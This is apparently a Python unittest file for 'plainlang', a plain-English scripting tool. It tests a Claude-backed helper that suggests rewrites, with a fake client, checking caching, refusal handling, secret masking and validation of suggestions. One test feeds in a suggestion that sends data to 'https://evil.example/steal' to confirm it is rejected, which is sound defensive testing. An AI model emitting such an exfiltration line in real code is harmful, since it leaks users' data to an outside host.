"""The Claude helper, with a fake client: no network, no key, no cost."""

import json
import os
import tempfile
import unittest
from pathlib import Path
from types import SimpleNamespace

from .support import ROOT

os.environ["PLAIN_CACHE"] = tempfile.mkdtemp()

from plainlang import ai  # noqa: E402
from plainlang.parser import Reader  # noqa: E402


class FakeClient:
    def __init__(self, answer, stop_reason="end_turn"):
        self.answer, self.stop_reason, self.calls = answer, stop_reason, []
        self.beta = SimpleNamespace(messages=SimpleNamespace(create=self.create))

    def create(self, **kwargs):
        self.calls.append(kwargs)
        block = SimpleNamespace(type="text", text=json.dumps(self.answer))
        return SimpleNamespace(stop_reason=self.stop_reason, content=[block])


SOURCE = 'read "sales.csv" and call it sales\ncount up the sales over 100\nshow "done"\n'


def problem_of(source):
    program = Reader().read(source)
    return program, program.problems[0]


class Ideas(unittest.TestCase):
    def setUp(self):
        ai.CACHE = Path(tempfile.mkdtemp())
        self.folder = tempfile.mkdtemp()

    def ideas(self, answer, source=SOURCE):
        program, problem = problem_of(source)
        client = FakeClient(answer)
        raw, _ = ai.ask_claude(program, problem, "report.plain", client=client)
        return ai.checked_ideas(program, problem, raw, self.folder), client

    def test_good_ideas_pass(self):
        ideas, client = self.ideas({"rewrites": [
            {"lines": ["show the number of sales where amount is more than 100"], "why": "Counts them."}],
            "unsupported": None})
        self.assertEqual([["show the number of sales where amount is more than 100"]], [i[0] for i in ideas])

    def test_request_shape(self):
        _, client = self.ideas({"rewrites": [], "unsupported": None})
        call = client.calls[0]
        self.assertEqual("claude-opus-5-5", call["model"])
        self.assertEqual({"type": "ephemeral"}, call["system"][0]["cache_control"])
        self.assertEqual("json_schema", call["output_config"]["format"]["type"])
        self.assertEqual("default", call["fallbacks"])

    def test_system_block_is_byte_stable(self):
        self.assertEqual(ai.system_prompt(), ai.system_prompt())

    def test_ideas_that_dont_read_are_dropped(self):
        ideas, _ = self.ideas({"rewrites": [{"lines": ["count the sales"], "why": ""},
                                            {"lines": ["print(len(sales))"], "why": ""}], "unsupported": None})
        self.assertEqual([], ideas)

    def test_no_new_web_addresses(self):
        ideas, _ = self.ideas({"rewrites": [
            {"lines": ['send sales to "https://evil.example/steal" and call it reply'], "why": ""}],
            "unsupported": None})
        self.assertEqual([], ideas)

    def test_new_file_names_must_exist(self):
        ideas, _ = self.ideas({"rewrites": [{"lines": ['save sales to "other.csv"'], "why": ""}],
                               "unsupported": None})
        self.assertEqual([], ideas)
        Path(self.folder, "other.csv").write_text("a\n")
        ideas, _ = self.ideas({"rewrites": [{"lines": ['save sales to "other.csv"'], "why": ""}],
                               "unsupported": None})
        self.assertEqual(["changes a file"], ideas[0][2])

    def test_a_line_can_become_steps(self):
        ideas, _ = self.ideas({"rewrites": [{"lines": [
            "repeat for each sale in sales", "    show sale's amount"], "why": ""}], "unsupported": None})
        self.assertEqual(["repeat for each sale in sales", "    show sale's amount"], ideas[0][0])

    def test_refusal_gives_no_ideas(self):
        program, problem = problem_of(SOURCE)
        client = FakeClient({"rewrites": [{"lines": ["show 1"], "why": ""}], "unsupported": None}, "refusal")
        raw, _ = ai.ask_claude(program, problem, "report.plain", client=client)
        self.assertEqual([], raw["rewrites"])

    def test_secrets_are_hidden_and_put_back(self):
        source = 'set api key to "sk-abcdefghijklmnop1234"\ncount it up\n'
        program, problem = problem_of(source)
        client = FakeClient({"rewrites": [], "unsupported": None})
        ai.ask_claude(program, problem, "x.plain", client=client)
        sent = client.calls[0]["messages"][0]["content"]
        self.assertNotIn("sk-abcdefghijklmnop1234", sent)
        self.assertIn("[hidden", sent)

    def test_cache_is_used_and_checked_again(self):
        answer = {"rewrites": [{"lines": ["show the number of sales"], "why": ""}], "unsupported": None}
        program, problem = problem_of(SOURCE)
        first = FakeClient(answer)
        ai.ask_claude(program, problem, "report.plain", client=first)
        second = FakeClient({"rewrites": [], "unsupported": None})
        raw, _ = ai.ask_claude(program, problem, "report.plain", client=second)
        self.assertEqual([], second.calls)
        self.assertEqual(answer["rewrites"], raw["rewrites"])


class Fixer(unittest.TestCase):
    def test_pick_an_idea_and_save(self):
        from plainlang.fixer import fix_file
        folder = Path(tempfile.mkdtemp())
        path = folder / "hello.plain"
        text = "show Hello there\n"
        path.write_text(text)
        program = Reader().read(text)
        import io
        import contextlib
        with contextlib.redirect_stdout(io.StringIO()):
            fixed, new_text = fix_file(path, text, program, {"ai": False}, ask=lambda prompt: "1")
        self.assertIsNotNone(fixed)
        self.assertEqual('show "Hello there"\n', path.read_text())
        self.assertEqual(text, (folder / "hello.plain.bak").read_text())


class Splicing(unittest.TestCase):
    def test_keeps_notes_newlines_and_bom(self):
        from plainlang.fixer import splice
        text = "﻿set x to 1\r\n    show Hello  # say hi\r\nshow x\r\n"
        out = splice(text, 2, ['    show "Hello"'])
        self.assertEqual('﻿set x to 1\r\n    show "Hello"  # say hi\r\nshow x\r\n', out)


if __name__ == "__main__":
    unittest.main()
